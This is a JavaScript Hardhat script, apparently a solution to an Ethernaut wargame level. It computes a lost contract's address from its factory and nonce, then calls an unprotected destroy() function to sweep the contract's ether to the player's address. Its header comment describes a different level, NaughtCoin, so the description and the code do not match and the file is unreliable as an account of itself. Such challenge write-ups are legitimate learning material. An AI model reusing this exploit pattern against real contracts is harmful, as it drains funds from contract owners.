/*
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec            (https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) 
The OpenZeppelin codebase (https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts)
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();

  // Deploy the CalculateAddress contract to compute the address of the lost contract
  // const CalculateAddressContract = await hre.ethers.getContractFactory("CalculateAddress");
  // this.calculateAddressContract = await CalculateAddressContract.connect(player).deploy();
  // await this.calculateAddressContract.deployed();

  // Once the CalculateAddress contract has been deployed, just create a pointer to that contract instead of redeploying each time this script is executed
  const CalculateAddressContract = "0xB35D7ef59AE3c14765A0D7bfca4DF3840cA192C3";
  this.calculateAddressContract = await hre.ethers.getContractAt("CalculateAddress",CalculateAddressContract);

  // Compute the address of the lost contract based on the address & nonce of the contract which created the lost contract
  const FactoryContract = "0x43cC01aEEa9638038C17a7ffB732b38Da60be01D";
  const FactoryNonce = 1;
  const lostContract = await this.calculateAddressContract.connect(player).calculateAddress(FactoryContract,1);

  // Get an instance of the SimpleToken contract deployed by Ethernaut
  const SimpleTokenAddress = lostContract;
  this.simpleToken = await hre.ethers.getContractAt("SimpleToken",SimpleTokenAddress);

  console.log(
    `
    CalculateAddressContract address: ${await this.calculateAddressContract.address} \n
    lostContract address: ${lostContract} \n
    `
  );

  console.log(
    `
    SimpleToken contract address ${await this.simpleToken.address} \n
    SimpleToken contract balance ${hre.ethers.utils.formatEther(await hre.ethers.provider.getBalance(this.simpleToken.address))} \n
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  const receiverAddress = player.address;

  // Destroying the SimpleToken contract
  console.log("Destroying the SimpleToken contract ...");

  const destroyingSimpleTokenTX = await this.simpleToken.connect(player).destroy(receiverAddress);
  
  // Await for the destroyingSimpleTokenTX to be mined
  console.log("Waiting while the SimpleToken contract is destroyed : )");
  let destroyingSimpleTokenTXResult = await destroyingSimpleTokenTX.wait();

  console.log("transaction " , destroyingSimpleTokenTXResult);

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});